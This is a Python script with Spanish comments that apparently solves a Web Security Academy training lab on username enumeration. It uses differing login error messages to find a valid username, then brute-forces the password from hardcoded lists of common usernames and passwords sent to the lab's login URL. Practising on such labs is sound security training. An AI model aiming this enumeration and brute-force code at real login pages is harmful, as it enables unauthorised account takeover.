"""
Lab 1 - Enumeracion de nombres de usuario a través de diferentes respuestas

objetivo: Conseguir un nombre y password validos para acceder a la aplicacion
"""

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login(url, username, password):
    data = {'username': username, 'password': password}
    solicitud = requests.post(url, data=data, allow_redirects=True)
    respuesta = solicitud.text
    
    if solicitud.status_code // 100 != 4:
        return 1
       
    texto_usuario_invalido = 'Invalid username'
    if texto_usuario_invalido in respuesta:
        return texto_usuario_invalido
    
    texto_password_invalido = 'Incorrect password'
    if texto_password_invalido in respuesta:
        return texto_password_invalido
    
    return False


        
def recorrer_usuarios(url, usernames):
    for username in usernames:
        print(f'Probando usuario: {username}')
        if login(url, username, '') == 'Incorrect password':
            return username
        
    return False

def recorrer_passwords(url, username, passwords):
    for password in passwords:
        print(f'Probando password: {password}')
        if login(url, username, password) == 1:
            return password
    

def main():
    usernames = ['carlos','root','admin','test','guest','info','adm','mysql','user','administrator','oracle','ftp','pi','puppet','ansible','ec-user','vagrant','azureuser','academico','acceso','access','accounting','accounts','acid','activestat','ad','adam','adkit','admin','administracion','administrador','administrator','administrators','admins','ads','adserver','adsl','ae','af','affiliate','affiliates','afiliados','ag','agenda','agent','ai','aix','ajax','ak','akamai','al','alabama','alaska','albuquerque','alerts','alpha','alterwind','am','amarillo','americas','an','anaheim','analyzer','announce','announcements','antivirus','ao','ap','apache','apollo','app','app01','app1','apple','application','applications','apps','appserver','aq','ar','archie','arcsight','argentina','arizona','arkansas','arlington','as','as400','asia','asterix','at','athena','atlanta','atlas','att','au','auction','austin','auth','auto','autodiscover']
    passwords = ['123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','123123','baseball','abc123','football','monkey','letmein','shadow','master','666666','qwertyuiop','123321','mustang','1234567890','michael','654321','superman','1qaz2wsx','7777777','121212','000000','qazwsx','123qwe','killer','trustno1','jordan','jennifer','zxcvbnm','asdfgh','hunter','buster','soccer','harley','batman','andrew','tigger','sunshine','iloveyou','2000','charlie','robert','thomas','hockey','ranger','daniel','starwars','klaster','112233','george','computer','michelle','jessica','pepper','1111','zxcvbn','555555','11111111','131313','freedom','777777','pass','maggie','159753','aaaaaa','ginger','princess','joshua','cheese','amanda','summer','love','ashley','nicole','chelsea','biteme','matthew','access','yankees','987654321','dallas','austin','thunder','taylor','matrix','mobilemail','mom','monitor','monitoring','montana','moon','moscow']
    print("Ataque de fuerza bruta para obtener username y password")
    url = "https://0a7b0097040124848384527c00770007.web-security-academy.net/login"
    
    username = recorrer_usuarios(url,usernames)
    password = recorrer_passwords(url, username, passwords)
    
    print (f'username: {username}')
    print (f'password: {password}')
    
if __name__ == "__main__":
    main()